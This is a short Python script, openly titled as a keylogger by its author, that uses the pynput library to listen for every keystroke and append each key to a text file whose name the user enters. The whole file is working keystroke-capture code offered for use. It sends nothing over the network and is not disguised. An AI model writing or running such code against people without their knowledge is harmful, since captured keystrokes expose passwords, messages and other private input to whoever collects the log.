from pynput import keyboard

print("=" * 100)
print("Keylogger by Senpai_Desi")
print("="*100)

filenamestr = input("Please give a file name! ")
class KeyLogger():
    def __init__(self, filename = f"{filenamestr}.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        with open(self.filename, 'a') as logs:
            logs.write(self.get_char(key) + " ")

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input()
